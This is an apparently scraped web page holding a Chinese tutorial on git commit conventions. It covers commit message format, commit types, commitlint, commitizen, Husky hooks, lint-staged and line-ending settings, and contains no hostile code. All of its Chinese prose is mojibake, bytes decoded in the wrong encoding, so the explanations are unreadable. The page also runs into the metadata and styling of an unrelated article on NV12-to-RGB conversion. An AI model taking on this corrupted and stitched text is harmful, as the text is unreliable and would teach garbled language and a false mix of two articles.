<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">type</span>&gt;</span>(<span class="hljs-tag">&lt;<span class="hljs-name">scope</span>&gt;</span>)!: <span class="hljs-tag">&lt;<span class="hljs-name">subject</span>&gt;</span>
â€‹
<span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>
â€‹
<span class="hljs-tag">&lt;<span class="hljs-name">footer</span>&gt;</span>
</code></pre>
<ul>
<li><code>&lt;type&gt;</code>ï¼šå˜æ›´ç±»å‹ï¼ˆå¿…å¡«ï¼Œå°å†™ï¼‰</li>
<li><code>(&lt;scope&gt;)</code>ï¼šå½±å“èŒƒå›´ï¼ˆå¯é€‰ï¼Œå»ºè®®å¡«ï¼‰</li>
<li><code>!</code>ï¼šç ´åæ€§å˜æ›´ï¼ˆBreaking Changeï¼Œå¯é€‰ï¼‰</li>
<li><code>&lt;subject&gt;</code>ï¼šä¸€å¥è¯æ¦‚æ‹¬å˜æ›´ï¼ˆå¿…å¡«ï¼‰</li>
<li><code>&lt;body&gt;</code>ï¼šä¸ºä»€ä¹ˆæ”¹ã€æ€ä¹ˆæ”¹ã€å½±å“ç‚¹ï¼ˆå¯é€‰ï¼Œä½†æ¨èåœ¨å¤æ‚æäº¤ä¸­å¡«å†™ï¼‰</li>
<li><code>&lt;footer&gt;</code>ï¼šå…³è” Issue/PRã€Breaking Change è¯´æ˜ï¼ˆå¯é€‰ï¼‰</li>
</ul>
<h3 data-id="heading-9">1.1 subjectï¼ˆå¿…é¡»ï¼‰</h3>
<ul>
<li>ç”¨ç¥ˆä½¿å¥/åŠ¨è¯å¼€å¤´ï¼ˆä¸­æ–‡ä¹Ÿç­‰ä»·ï¼‰ï¼šä¾‹å¦‚â€œæ–°å¢â€¦/ä¿®å¤â€¦/è°ƒæ•´â€¦â€</li>
<li>ç®€çŸ­ã€å…·ä½“ã€å¯è¯»ï¼šä¼˜å…ˆè¯´æ˜â€œåšäº†ä»€ä¹ˆâ€ï¼Œè€Œä¸æ˜¯â€œæ”¹äº†ä»€ä¹ˆæ–‡ä»¶â€</li>
<li>ä¸è¦ä»¥å¥å·ç»“å°¾ï¼›ä¸è¦å†™æ— æ„ä¹‰æè¿°ï¼ˆå¦‚â€œupdateâ€ã€â€œfix bugâ€ï¼‰</li>
<li>å»ºè®®æ§åˆ¶åœ¨ 100 å­—ç¬¦å†…ï¼ˆä¸ <code>commitlint</code> çš„ <code>header-max-length</code> ä¿æŒä¸€è‡´ï¼‰</li>
</ul>
<h3 data-id="heading-10">1.2 bodyï¼ˆæ¨èï¼‰</h3>
<p>å½“å˜æ›´ä¸æ­¢ä¸€å¤„ã€å­˜åœ¨æƒè¡¡æˆ–å½±å“é¢è¾ƒå¤§æ—¶ï¼Œå»ºè®®å†™ bodyï¼š</p>
<ul>
<li>èƒŒæ™¯/åŸå› ï¼šä¸ºä»€ä¹ˆè¦æ”¹</li>
<li>æ–¹æ¡ˆ/å®ç°ï¼šæ€ä¹ˆæ”¹çš„</li>
<li>å½±å“/é£é™©ï¼šæœ‰å“ªäº›å…¼å®¹æ€§æˆ–ä¸Šçº¿æ³¨æ„ç‚¹</li>
</ul>
<h3 data-id="heading-11">1.3 footerï¼ˆæŒ‰éœ€ï¼‰</h3>
<ul>
<li>
<p>å…³è” Issue/ä»»åŠ¡ï¼š<code>Closes #123</code>ã€<code>Refs #123</code></p>
</li>
<li>
<p>ç ´åæ€§å˜æ›´ï¼ˆä¸¤ç§å†™æ³•äºŒé€‰ä¸€ï¼‰ï¼š</p>
<ul>
<li>åœ¨ header é‡Œä½¿ç”¨ <code>!</code></li>
<li>æˆ–åœ¨ footer å†™ï¼š<code>BREAKING CHANGE: xxx</code></li>
</ul>
</li>
</ul>
<hr/>
<h2 data-id="heading-12">2. type ä¸ scope çº¦å®šï¼ˆå¿…é¡»ç»Ÿä¸€ï¼‰</h2>
<h3 data-id="heading-13">2.1 æ¨è type åˆ—è¡¨ï¼ˆå»ºè®®ä¸ commitlint é…ç½®ä¿æŒä¸€è‡´ï¼‰</h3>






































































<table><thead><tr><th>type</th><th>ç”¨é€”</th><th>ä¾‹å­</th></tr></thead><tbody><tr><td>feat</td><td>æ–°å¢åŠŸèƒ½</td><td><code>feat(auth): æ”¯æŒçŸ­ä¿¡ç™»å½•</code></td></tr><tr><td>fix</td><td>ä¿®å¤ç¼ºé™·</td><td><code>fix(router): ä¿®å¤é‡å®šå‘æ­»å¾ªç¯</code></td></tr><tr><td>docs</td><td>æ–‡æ¡£å˜æ›´</td><td><code>docs: æ›´æ–°å®‰è£…è¯´æ˜</code></td></tr><tr><td>style</td><td>ä»…æ ¼å¼/æ ·å¼ï¼ˆä¸å½±å“é€»è¾‘ï¼‰</td><td><code>style: æ ¼å¼åŒ–ä»£ç </code></td></tr><tr><td>refactor</td><td>é‡æ„ï¼ˆé feat/fixï¼‰</td><td><code>refactor(core): æ‹†åˆ†æ ¡éªŒé€»è¾‘</code></td></tr><tr><td>perf</td><td>æ€§èƒ½ä¼˜åŒ–</td><td><code>perf(list): ä¼˜åŒ–é¦–å±æ¸²æŸ“</code></td></tr><tr><td>test</td><td>æµ‹è¯•ç›¸å…³</td><td><code>test: è¡¥å……ç™»å½•å•æµ‹</code></td></tr><tr><td>build</td><td>æ„å»º/ä¾èµ–/æ‰“åŒ…</td><td><code>build: å‡çº§ pnpm ç‰ˆæœ¬</code></td></tr><tr><td>ci</td><td>CI é…ç½®ä¸è„šæœ¬</td><td><code>ci: æ·»åŠ å‘å¸ƒæµæ°´çº¿</code></td></tr><tr><td>chore</td><td>æ‚é¡¹ï¼ˆä¸å½±å“ä¸šåŠ¡/åŠŸèƒ½ï¼‰</td><td><code>chore: æ›´æ–°ä¾èµ–ä¸è„šæ‰‹æ¶é…ç½®</code></td></tr><tr><td>revert</td><td>å›æ»šæäº¤</td><td><code>revert: feat(auth): æ”¯æŒçŸ­ä¿¡ç™»å½•</code></td></tr><tr><td>wip</td><td>å¼€å‘ä¸­ä¸´æ—¶æäº¤ï¼ˆæ…ç”¨ï¼‰</td><td><code>wip: è°ƒè¯•ç™»å½•æ€</code></td></tr></tbody></table>
<p>å»ºè®®ï¼š<code>wip</code> ä»…ç”¨äºä¸ªäººåˆ†æ”¯ï¼›åˆå¹¶åˆ°ä¸»åˆ†æ”¯å‰åº”é€šè¿‡ <code>rebase/squash</code> æ¸…ç†æˆæœ‰æ„ä¹‰çš„æäº¤ã€‚</p>
<h3 data-id="heading-14">2.2 scope å–å€¼å»ºè®®ï¼ˆå¯é€‰ä½†æ¨èï¼‰</h3>
<p>scope ç”¨æ¥è¯´æ˜å½±å“èŒƒå›´ï¼Œå»ºè®®ä½¿ç”¨â€œæ¨¡å—/é¢†åŸŸ/ç›®å½•åâ€ï¼Œä¿æŒçŸ­ä¸”ç¨³å®šï¼š</p>
<ul>
<li>ä¸šåŠ¡åŸŸï¼š<code>auth</code>ã€<code>user</code>ã€<code>order</code></li>
<li>åŸºç¡€è®¾æ–½ï¼š<code>router</code>ã€<code>store</code>ã€<code>api</code></li>
<li>å·¥ç¨‹åŒ–ï¼š<code>build</code>ã€<code>ci</code>ã€<code>deps</code></li>
<li>æ–‡æ¡£/é…ç½®ï¼š<code>readme</code>ã€<code>eslint</code>ã€<code>prettier</code></li>
</ul>
<hr/>
<h2 data-id="heading-15">3. ç¤ºä¾‹ï¼ˆç›´æ¥ç…§æŠ„å³å¯ï¼‰</h2>
<ul>
<li>æ™®é€šæäº¤ï¼š<code>feat: æ–°å¢å¯¼å‡ºåŠŸèƒ½</code></li>
<li>å¸¦ scopeï¼š<code>fix(auth): ä¿®å¤ token åˆ·æ–°å¤±è´¥</code></li>
<li>ç ´åæ€§å˜æ›´ï¼š<code>feat(api)!: è°ƒæ•´ç”¨æˆ·æ¥å£è¿”å›ç»“æ„</code></li>
</ul>
<p>å¸¦ body/footerï¼š</p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-built_in">feat</span>(user): æ–°å¢ä¸ªäººèµ„æ–™ç¼–è¾‘
â€‹
- æ”¯æŒå¤´åƒä¸Šä¼ ä¸è£å‰ª
- å¢åŠ è¾“å…¥æ ¡éªŒä¸é”™è¯¯æç¤º
â€‹
Closes <span class="hljs-number">#123</span>
</code></pre>
<hr/>
<h2 data-id="heading-16">4. å·¥å…·é“¾è½åœ°ï¼ˆä¸€ï¼‰ï¼šæäº¤ä¿¡æ¯è§„èŒƒï¼ˆcommitlint + commitizenï¼‰</h2>
<p>ç›®æ ‡ï¼šåœ¨æœ¬åœ°æ‹¦æˆªä¸åˆè§„çš„ commit messageï¼Œå¹¶æä¾›ä½æˆæœ¬çš„è§„èŒƒåŒ–æäº¤æ–¹å¼ã€‚</p>
<h3 data-id="heading-17">4.1 å®‰è£…ä¾èµ–</h3>
<pre><code class="hljs language-sql" lang="sql">pnpm <span class="hljs-keyword">add</span> <span class="hljs-operator">-</span>D husky <span class="hljs-variable">@commitlint</span><span class="hljs-operator">/</span>cli <span class="hljs-variable">@commitlint</span><span class="hljs-operator">/</span>config<span class="hljs-operator">-</span>conventional commitizen
</code></pre>
<h3 data-id="heading-18">4.2 åˆå§‹åŒ– Husky</h3>
<pre><code class="hljs language-bash" lang="bash">pnpm <span class="hljs-built_in">exec</span> husky init
</code></pre>
<p>åˆå§‹åŒ–åé€šå¸¸ä¼šå‘ç”Ÿè¿™äº›å˜åŒ–ï¼ˆä»¥ Husky 9+ ä¸ºä¾‹ï¼‰ï¼š</p>
<ul>
<li>æ–°å¢ <code>.husky/</code> ç›®å½•ï¼ˆç”¨äºå­˜æ”¾ hooksï¼‰</li>
<li>ç”Ÿæˆ <code>.husky/pre-commit</code>ï¼ˆHusky åˆå§‹åŒ–ä¼šæ”¾ä¸€ä¸ªé»˜è®¤ç¤ºä¾‹ï¼Œå¸¸è§é»˜è®¤å†…å®¹æ˜¯ <code>pnpm test</code>ï¼Œå¯æŒ‰é¡¹ç›®éœ€è¦æ”¹æˆ <code>lint-staged</code>ï¼‰</li>
<li>åœ¨ <code>package.json</code> å†™å…¥/æ›´æ–° <code>prepare</code> è„šæœ¬ï¼Œç¡®ä¿å®‰è£…ä¾èµ–åä¼šè‡ªåŠ¨å¯ç”¨ hooks</li>
</ul>
<p>ç¡®ä¿ <code>package.json</code> è‡³å°‘åŒ…å«ï¼š</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span> <span class="hljs-attr">"scripts"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span> <span class="hljs-attr">"prepare"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"husky"</span> <span class="hljs-punctuation">}</span> <span class="hljs-punctuation">}</span>
</code></pre>
<h3 data-id="heading-19">4.3 ç¬¬ä¸€æ­¥ï¼šåªé…ç½® commitlintï¼ˆå…ˆæ ¡éªŒï¼Œå†å¼•å¯¼ï¼‰</h3>
<ol start="0">
<li>åˆ›å»º <code>commitlint.config.ts</code>ï¼š</li>
</ol>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> {
 Â <span class="hljs-keyword">extends</span>: [<span class="hljs-string">'@commitlint/config-conventional'</span>],
}
</code></pre>
<blockquote>
<p>åç»­æ ¹æ®éœ€æ±‚å¯ä¸°å¯Œé…ç½®</p>
</blockquote>
<ol start="2">
<li>é…ç½® <code>.husky/commit-msg</code>ï¼š</li>
</ol>
<pre><code class="hljs language-bash" lang="bash">pnpm <span class="hljs-built_in">exec</span> commitlint --edit <span class="hljs-variable">$1</span>
</code></pre>
<p>å…³äº <code>pnpm exec</code> ä¸ <code>pnpm dlx</code>ï¼š</p>
<ul>
<li><code>pnpm exec</code>ï¼šæ‰§è¡Œ<strong>å½“å‰é¡¹ç›®å·²å®‰è£…</strong>çš„ä¾èµ–ï¼ˆä» <code>node_modules/.bin</code> è§£æå¯æ‰§è¡Œæ–‡ä»¶ï¼‰ï¼›å›¢é˜Ÿåä½œä¸‹æ›´ç¨³å®šã€ç‰ˆæœ¬å¯æ§ï¼ˆæ¨èï¼‰</li>
<li><code>pnpm dlx</code>ï¼šä¸´æ—¶ä¸‹è½½å¹¶æ‰§è¡ŒæŸä¸ªåŒ…ï¼ˆä¸€æ¬¡æ€§è¿è¡Œå·¥å…·æ—¶æ–¹ä¾¿ï¼‰ï¼Œä½†ç‰ˆæœ¬å¯èƒ½éšæ—¶é—´å˜åŒ–ï¼Œä¸é€‚åˆä½œä¸ºä»“åº“é•¿æœŸ hooks ä¾èµ–</li>
</ul>
<p><code>pnpm exec commitlint --edit $1</code> çš„å·¥ä½œæµç¨‹ï¼ˆç®€è¿°ï¼‰ï¼š</p>
<ol start="0">
<li><code>git commit</code> è§¦å‘ <code>commit-msg</code> hook</li>
<li>Husky æ‰§è¡Œ <code>.husky/commit-msg</code></li>
<li><code>pnpm exec</code> åœ¨å½“å‰é¡¹ç›®ä¸­è§£æåˆ° <code>commitlint</code> å¯æ‰§è¡Œæ–‡ä»¶</li>
<li><code>commitlint</code> è¯»å– <code>commitlint.config.*</code> ç­‰é…ç½®</li>
<li><code>commitlint</code> è¯»å– <code>$1</code> æŒ‡å‘çš„ commit message ä¸´æ—¶æ–‡ä»¶å¹¶æ ¡éªŒ</li>
<li>æ ¡éªŒå¤±è´¥è¿”å›é 0ï¼ŒGit ä¸­æ­¢æäº¤ï¼›æ ¡éªŒé€šè¿‡åˆ™ç»§ç»­æäº¤</li>
</ol>
<h4 data-id="heading-20">é˜¶æ®µæ€»ç»“</h4>
<ul>
<li>ç°åœ¨ä½¿ç”¨ <code>git commit -m "..."</code> æäº¤æ—¶ï¼Œå¦‚æœ message ä¸ç¬¦åˆè§„èŒƒï¼Œä¼šè¢«ç›´æ¥æ‹¦æˆª</li>
<li>ä½†è¿™ä¸€æ­¥ä»ä¾èµ–â€œæ‰‹å†™ messageâ€ï¼Œå¯¹æ–°äººæˆ–é«˜é¢‘æäº¤åœºæ™¯ä¸å¤Ÿå‹å¥½</li>
</ul>
<h3 data-id="heading-21">4.4 ç¬¬äºŒæ­¥ï¼šé…ç½® commitizenï¼ˆäº¤äº’å¼ç”Ÿæˆ commit messageï¼‰</h3>
<p>å½“ä½ å®‰è£… <code>commitizen</code> åï¼Œä¼šè·å¾—ä¸¤ä¸ªç­‰ä»·å‘½ä»¤ï¼š</p>
<ul>
<li><code>git-cz</code>ï¼šå®Œæ•´å‘½ä»¤åï¼Œæ›´ç›´è§‚ï¼ˆæ¨èï¼‰</li>
<li><code>cz</code>ï¼šç®€å†™åˆ«åï¼Œè¾“å…¥æ›´çŸ­</li>
</ul>
<p>å®ƒä»¬éƒ½ç”¨äºå¯åŠ¨äº¤äº’å¼æäº¤æµç¨‹ï¼Œå·®åˆ«ä»…åœ¨å‘½ä»¤åã€‚</p>
<ol start="0">
<li>é€‰æ‹©ä¸€ä¸ªé€‚é…å™¨ï¼ˆäºŒé€‰ä¸€å®‰è£…ï¼‰ï¼š</li>
</ol>
<pre><code class="hljs language-csharp" lang="csharp">pnpm <span class="hljs-keyword">add</span> -D cz-conventional-changelog
<span class="hljs-meta"># æˆ–</span>
pnpm <span class="hljs-keyword">add</span> -D cz-git
</code></pre>
<ol start="2">
<li>åœ¨ <code>package.json</code> ä¸­é…ç½®é€‚é…å™¨ï¼š</li>
</ol>
<ul>
<li>ä½¿ç”¨ <code>cz-conventional-changelog</code>ï¼š</li>
</ul>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span> <span class="hljs-attr">"config"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span> <span class="hljs-attr">"commitizen"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span> <span class="hljs-attr">"path"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"cz-conventional-changelog"</span> <span class="hljs-punctuation">}</span> <span class="hljs-punctuation">}</span> <span class="hljs-punctuation">}</span>
</code></pre>
<ul>
<li>ä½¿ç”¨ <code>cz-git</code>ï¼š</li>
</ul>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span> <span class="hljs-attr">"config"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span> <span class="hljs-attr">"commitizen"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span> <span class="hljs-attr">"path"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"cz-git"</span> <span class="hljs-punctuation">}</span> <span class="hljs-punctuation">}</span> <span class="hljs-punctuation">}</span>
</code></pre>
<ol start="3">
<li>å¢åŠ ç»Ÿä¸€å…¥å£è„šæœ¬ï¼ˆæ¨èï¼‰ï¼š</li>
</ol>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span> <span class="hljs-attr">"scripts"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span> <span class="hljs-attr">"commit"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"git-cz"</span> <span class="hljs-punctuation">}</span> <span class="hljs-punctuation">}</span>
</code></pre>
<p>æäº¤æ–¹å¼ï¼š</p>
<pre><code class="hljs language-sql" lang="sql">git <span class="hljs-keyword">add</span> <span class="hljs-operator">-</span>A
pnpm <span class="hljs-keyword">commit</span>
</code></pre>
<h4 data-id="heading-22">é˜¶æ®µæ€»ç»“</h4>
<ul>
<li>ç°åœ¨å›¢é˜Ÿå¯ä»¥é€šè¿‡äº¤äº’å¼æ–¹å¼ç”Ÿæˆè§„èŒƒ messageï¼Œå‡ºé”™ç‡æ˜¾è‘—é™ä½</li>
<li><code>commitlint</code> ä»ç„¶ä¿ç•™ï¼šå³ä½¿æœ‰äººç»•è¿‡äº¤äº’æ‰‹å†™ messageï¼Œä¹Ÿä¼šè¢«æ ¡éªŒå…œåº•</li>
</ul>
<hr/>
<h2 data-id="heading-23">5. å·¥å…·é“¾è½åœ°ï¼ˆäºŒï¼‰ï¼špre-commit æ ¡éªŒï¼ˆlint-stagedï¼‰</h2>
<p>ç›®æ ‡ï¼šåœ¨æäº¤å‰åªå¯¹â€œæš‚å­˜åŒºæ–‡ä»¶â€æ‰§è¡Œæ ¡éªŒ/æ ¼å¼åŒ–ï¼Œé¿å…æŠŠä¸åˆè§„ä»£ç å¸¦è¿›ä»“åº“ã€‚</p>
<h3 data-id="heading-24">5.1 å®‰è£…ä¾èµ–</h3>
<pre><code class="hljs language-csharp" lang="csharp">pnpm <span class="hljs-keyword">add</span> -D lint-staged
</code></pre>
<p>è¯´æ˜ï¼š<code>lint-staged</code> åªè´Ÿè´£â€œæŒ‘é€‰æš‚å­˜åŒºæ–‡ä»¶å¹¶è¿è¡Œå‘½ä»¤â€ï¼Œå¹¶ä¸è‡ªå¸¦è§„åˆ™ï¼›ä½ éœ€è¦è‡ªè¡Œé€‰æ‹©å¹¶é…ç½® <code>eslint/prettier/stylelint</code> ç­‰å·¥å…·ã€‚</p>
<h3 data-id="heading-25">5.2 é…ç½® lint-stagedï¼ˆç¤ºä¾‹ï¼‰</h3>
<p>åˆ›å»º <code>.lintstagedrc.json</code>ï¼š</p>
<pre><code class="hljs language-less" lang="less">{
 Â "*.{<span class="hljs-selector-tag">js</span>,<span class="hljs-selector-tag">jsx</span>,<span class="hljs-selector-tag">ts</span>,<span class="hljs-selector-tag">tsx</span>,<span class="hljs-selector-tag">vue</span>}": <span class="hljs-selector-attr">[<span class="hljs-string">"eslint --fix --cache"</span>]</span>,
 Â "*.{<span class="hljs-selector-tag">css</span>,<span class="hljs-selector-tag">scss</span>,<span class="hljs-selector-tag">sass</span>,<span class="hljs-selector-tag">less</span>,<span class="hljs-selector-tag">vue</span>}": <span class="hljs-selector-attr">[<span class="hljs-string">"stylelint --fix"</span>]</span>,
 Â "*.{<span class="hljs-selector-tag">js</span>,<span class="hljs-selector-tag">jsx</span>,<span class="hljs-selector-tag">ts</span>,<span class="hljs-selector-tag">tsx</span>,<span class="hljs-selector-tag">vue</span>,<span class="hljs-selector-tag">css</span>,<span class="hljs-selector-tag">scss</span>,<span class="hljs-selector-tag">sass</span>,<span class="hljs-selector-tag">less</span>,<span class="hljs-selector-tag">json</span>,<span class="hljs-selector-tag">md</span>,<span class="hljs-selector-tag">html</span>}": <span class="hljs-selector-attr">[<span class="hljs-string">"prettier --write"</span>]</span>
}
</code></pre>
<h3 data-id="heading-26">5.3 é…ç½® pre-commit hook</h3>
<p>ç¼–è¾‘ <code>.husky/pre-commit</code>ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">pnpm <span class="hljs-built_in">exec</span> lint-staged
</code></pre>
<h4 data-id="heading-27">é˜¶æ®µæ€»ç»“</h4>
<ul>
<li>ç°åœ¨æ¯æ¬¡æäº¤éƒ½ä¼šè‡ªåŠ¨å¯¹æš‚å­˜åŒºæ–‡ä»¶åšæ ¡éªŒ/æ ¼å¼åŒ–</li>
<li>ä¸é€šè¿‡åˆ™æäº¤å¤±è´¥ï¼Œä»æºå¤´å‡å°‘â€œæäº¤åæ‰å‘ç° lint æŠ¥é”™/æ ¼å¼ä¸ç»Ÿä¸€â€çš„æˆæœ¬</li>
</ul>
<hr/>
<h2 data-id="heading-28">6. è·¨å¹³å°ä¸€è‡´æ€§ï¼ˆå¼ºçƒˆå»ºè®®ï¼‰</h2>
<p>ç›®æ ‡ï¼šé¿å… Windows/macOS/Linux æ¢è¡Œç¬¦å·®å¼‚å¯¼è‡´çš„â€œæ— æ„ä¹‰ diffâ€ã€‚</p>
<h3 data-id="heading-29">6.1 <code>.editorconfig</code>ï¼ˆç¼–è¾‘å™¨å±‚ï¼‰</h3>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-attr">root</span> = <span class="hljs-literal">true</span>
â€‹
<span class="hljs-section">[*]</span>
<span class="hljs-attr">charset</span> = utf-<span class="hljs-number">8</span>
<span class="hljs-attr">indent_style</span> = space
<span class="hljs-attr">indent_size</span> = <span class="hljs-number">2</span>
<span class="hljs-attr">end_of_line</span> = lf
<span class="hljs-attr">insert_final_newline</span> = <span class="hljs-literal">true</span>
<span class="hljs-attr">trim_trailing_whitespace</span> = <span class="hljs-literal">true</span>
â€‹
<span class="hljs-section">[*.md]</span>
<span class="hljs-attr">trim_trailing_whitespace</span> = <span class="hljs-literal">false</span>
</code></pre>
<h3 data-id="heading-30">6.2 <code>.gitattributes</code>ï¼ˆGit å±‚ï¼‰</h3>
<pre><code class="hljs language-vbnet" lang="vbnet">* <span class="hljs-keyword">text</span>=<span class="hljs-keyword">auto</span> eol=lf
â€‹
*.png  <span class="hljs-keyword">binary</span>
*.jpg  <span class="hljs-keyword">binary</span>
*.jpeg <span class="hljs-keyword">binary</span>
*.gif  <span class="hljs-keyword">binary</span>
*.pdf  <span class="hljs-keyword">binary</span>
</code></pre>
<h3 data-id="heading-31">6.3 <code>.editorconfig</code> vs <code>.gitattributes</code>ï¼ˆåŒºåˆ«ä¸é…åˆï¼‰</h3>
<p>ä¸¤è€…ç»å¸¸ä¸€èµ·ç”¨ï¼Œä½†å…³æ³¨ç‚¹ä¸åŒï¼š</p>
<ul>
<li>ç”Ÿæ•ˆå±‚çº§ä¸åŒï¼š<code>.editorconfig</code> å½±å“â€œç¼–è¾‘å™¨/æ ¼å¼åŒ–å™¨åœ¨ä¿å­˜æ—¶æ€ä¹ˆå†™æ–‡ä»¶â€ï¼Œ<code>.gitattributes</code> å½±å“â€œGit åœ¨æ£€å‡º/æäº¤æ—¶æ€ä¹ˆè§„èŒƒåŒ–æ–‡ä»¶â€</li>
<li>è§£å†³é—®é¢˜ä¸åŒï¼š<code>.editorconfig</code> ç»Ÿä¸€ç¼©è¿›ã€ç¼–ç ã€è¡Œå°¾ç©ºç™½ã€æ˜¯å¦ä¿ç•™æœ«å°¾æ¢è¡Œï¼›<code>.gitattributes</code> ç»Ÿä¸€æ¢è¡Œç¬¦ã€æ ‡è®°äºŒè¿›åˆ¶æ–‡ä»¶ï¼ˆé¿å… diff ä¹±ç ï¼‰ã€ä»¥åŠ diff/merge ç­–ç•¥ç­‰</li>
<li>æœ€ä½³å®è·µï¼šä¸¤è€…é…åˆä½¿ç”¨ï¼Œæ—¢çº¦æŸå¼€å‘æ—¶çš„å†™å…¥è¡Œä¸ºï¼Œä¹Ÿä¿è¯ä»“åº“å±‚é¢çš„è·¨å¹³å°ä¸€è‡´æ€§</li>
</ul>
<hr/>
<h2 data-id="heading-32">7. å¸¸è§é—®é¢˜ï¼ˆæ’éšœé€ŸæŸ¥ï¼‰</h2>
<ul>
<li>Husky ä¸ç”Ÿæ•ˆï¼šç¡®è®¤æ‰§è¡Œè¿‡ <code>pnpm install</code> ä¸” <code>prepare</code> è„šæœ¬å·²è¿è¡Œï¼›å¿…è¦æ—¶æ£€æŸ¥ <code>git config core.hooksPath</code> æ˜¯å¦æŒ‡å‘ <code>.husky</code></li>
<li>ç´§æ€¥ç»•è¿‡æ ¡éªŒï¼š<code>git commit --no-verify</code>ï¼ˆä»…é™ç´§æ€¥æƒ…å†µï¼Œåç»­éœ€è¡¥è§„èŒƒæäº¤ï¼‰</li>
<li>Windows ä¸‹äº¤äº’æäº¤ä½“éªŒä¸ä½³ï¼šä¼˜å…ˆä½¿ç”¨ <code>pnpm commit</code>ï¼Œä¸è¦å¼ºåˆ¶åœ¨ hook ä¸­è¿›å…¥äº¤äº’å¼ç•Œé¢</li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[NV12 è½¬ RGB å®Œæ•´æŒ‡å—]]></title>    <link>https://juejin.cn/post/7592515924701724707</link>    <guid>https://juejin.cn/post/7592515924701724707</guid>    <pubDate>2026-01-08T07:48:15.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592515924701724707" data-draft-id="7592622563545956387" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="NV12 è½¬ RGB å®Œæ•´æŒ‡å—"/> <meta itemprop="keywords" content="å‰ç«¯,JavaScript"/> <meta itemprop="datePublished" content="2026-01-08T07:48:15.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="æ‚ å“‰æ‘¸é±¼å¤§ç‹"/> <meta itemprop="url" content="https://juejin.cn/user/3606845069731848"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            NV12 è½¬ RGB å®Œæ•´æŒ‡å—
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3606845069731848/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    æ‚ å“‰æ‘¸é±¼å¤§ç‹
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-08T07:48:15.000Z" title="Thu Jan 08 2026 07:48:15 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    15
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»8åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid 